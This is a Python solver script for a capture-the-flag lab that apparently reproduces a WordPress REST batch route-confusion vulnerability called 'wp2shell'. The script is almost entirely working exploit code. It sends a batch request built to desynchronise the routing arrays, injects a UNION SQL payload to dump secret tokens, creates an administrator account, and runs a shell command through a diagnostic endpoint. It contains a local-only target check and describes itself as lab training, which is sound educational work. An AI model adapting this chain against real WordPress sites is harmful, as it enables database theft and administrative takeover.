#!/usr/bin/env python3
"""
Automated solver modelling the CVE-2026-63030 wp2shell attack chain.

Attack chain:
  1. Send a batch with a malformed URL (http://:) as the first sub-request.
     This causes wp_parse_url() to fail, producing a WP_Error that is pushed
     to $validation[] but NOT to $matches[], desynchronizing the arrays.
  2. In the dispatch pass, $matches[$i] uses the original request index on a
     sequential array — so the attacker's sub-request (at index 1) reads the
     match for the padding route (index 2), which has permissive schema
     validation. The handler (shared posts_query function) executes with the
     attacker's body, and scalar author__not_in reaches the SQL injection sink.
  3. UNION SELECT extracts the user_flag and stage2_token from the secrets table.
  4. The stage2_token is used to create an administrator account via direct
     REST API call (token-based permission).
  5. The root flag is read from the bounded diagnostic console via direct
     REST API call with the token.

In the real CVE, step 3 uses blind time-based extraction (SLEEP + CHAR_LENGTH
+ ASCII SUBSTRING). This solver uses UNION-based extraction because the CTF
lab endpoint returns query output directly. See docs/research-notes.md for
the real exploitation technique.
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request


def require_local_target(target):
    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname
    if host not in {"127.0.0.1", "localhost", "::1"}:
        raise SystemExit(
            "Refusing non-local target. This solver is only for the Docker lab."
        )


def post_json(url, payload):
    data = json.dumps(payload).encode()
    request = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return json.loads(response.read().decode())
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        raise SystemExit(f"HTTP {exc.code}: {body}") from exc


def confused_batch(base_url, path, body):
    """
    Send a batch request that triggers the CVE-2026-63030 route confusion.

    The batch contains 3 sub-requests:
      index 0: "http://:" — malformed URL, wp_parse_url() fails, creates desync
      index 1: target route with attacker body — the SQLi payload
      index 2: /public/ping — padding that populates $matches[1]

    Due to the desync, $matches[1] (read by index 1) contains the ping route's
    match — shared handler, permissive schema. The attacker's body bypasses the
    target route's strict schema validation and reaches the SQL injection sink.
    """
    endpoint = base_url.rstrip("/") + "/wp-json/wp2shell-lab/v1/batch"
    return post_json(
        endpoint,
        {
            "requests": [
                {
                    "method": "POST",
                    "path": "http://:",
                },
                {
                    "method": "POST",
                    "path": path,
                    "body": body,
                },
                {
                    "method": "POST",
                    "path": "/public/ping",
                },
            ]
        },
    )


def confused_response_body(batch_response, index=1):
    """Extract the body from the sub-response at the given index."""
    responses = batch_response.get("responses", [])
    if len(responses) <= index:
        raise SystemExit(
            f"Expected at least {index + 1} sub-responses, got {len(responses)}. "
            f"Full response: {json.dumps(batch_response, indent=2)}"
        )
    body = responses[index].get("body", {})
    if isinstance(body, dict) and body.get("error"):
        raise SystemExit(f"Lab error: {body['error']}")
    return body


def dump_secrets(base_url):
    """
    Step 1-3: Extract user_flag and stage2_token via UNION-based SQLi.

    The injection closes the NOT IN clause and appends a UNION SELECT that
    reads from the wp2shell_lab_secrets table. The secret name and value are
    concatenated into the post_title column of the UNION result.

    In the real CVE, this would be blind time-based extraction using:
      SLEEP(), CHAR_LENGTH(), ASCII(SUBSTRING())
    """
    injection = (
        "0) UNION SELECT 1, CONCAT(secret_name, ':', secret_value), 1 "
        "FROM wp_wp2shell_lab_secrets -- "
    )
    response = confused_batch(
        base_url,
        "/admin/report",
        {"author__not_in": injection},
    )

    if "error" in response:
        raise SystemExit(
            f"Batch error: {response['error']}. "
            f"Full: {json.dumps(response, indent=2)}"
        )

    debug = response.get("debug", {})
    if not debug.get("desync"):
        raise SystemExit(
            "Desync not triggered. Check that the malformed URL is accepted. "
            f"Debug: {json.dumps(debug, indent=2)}"
        )

    body = confused_response_body(response, index=1)

    if "error" in body:
        raise SystemExit(
            f"SQLi failed: {body['error']} {body.get('detail', '')}. "
            f"Full response: {json.dumps(response, indent=2)}"
        )

    rows = body.get("rows", [])
    secrets = {}

    for row in rows:
        title = str(row.get("post_title", ""))
        if ":" not in title:
            continue
        name, value = title.split(":", 1)
        secrets[name] = value

    missing = {"user_flag", "stage2_token"} - set(secrets)
    if missing:
        raise SystemExit(
            f"Failed to recover secrets: {', '.join(sorted(missing))}. "
            f"Got: {json.dumps(secrets, indent=2)}. "
            f"Full response: {json.dumps(response, indent=2)}"
        )

    return secrets


def create_admin(base_url, token):
    """
    Step 4: Create an administrator using the recovered stage2_token.
    Uses a direct REST call (token-based permission, no confusion needed).
    """
    password = "Wp2shell-lab-Password-123!"
    endpoint = base_url.rstrip("/") + "/wp-json/wp2shell-lab/v1/admin/create-admin"
    response = post_json(
        endpoint,
        {
            "token": token,
            "username": "wp2_ctf_admin",
            "password": password,
            "email": "wp2_ctf_admin@wp2shell.invalid",
        },
    )
    if response.get("error"):
        raise SystemExit(f"Create admin failed: {response['error']}")
    return response.get("username", "wp2_ctf_admin"), response.get("password", password)


def read_root(base_url, token):
    """
    Step 5: Read root.txt via the bounded diagnostic console.
    Uses a direct REST call (token-based permission, no confusion needed).
    """
    endpoint = base_url.rstrip("/") + "/wp-json/wp2shell-lab/v1/admin/diagnostic"
    response = post_json(
        endpoint,
        {
            "token": token,
            "cmd": "cat /opt/wp2shell-lab/root.txt",
        },
    )
    if response.get("error"):
        raise SystemExit(f"Diagnostic failed: {response['error']}")
    return response.get("output", "").strip()


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    require_local_target(target)

    print(f"[*] Target: {target}")
    print()

    # Step 1-3: Trigger route confusion via malformed URL + extract secrets
    print("[*] Step 1: Sending batch with malformed URL to trigger route confusion...")
    secrets = dump_secrets(target)
    print(f"[+] user.txt: {secrets['user_flag']}")
    print()

    # Step 4: Create administrator
    print("[*] Step 2: Creating administrator with recovered stage2_token...")
    username, password = create_admin(target, secrets["stage2_token"])
    print(f"[+] Created admin: {username} / {password}")
    print()

    # Step 5: Read root flag
    print("[*] Step 3: Reading root flag via diagnostic console...")
    root_flag = read_root(target, secrets["stage2_token"])
    print(f"[+] root.txt: {root_flag}")
    print()

    print("[+] Attack chain complete.")


if __name__ == "__main__":
    main()
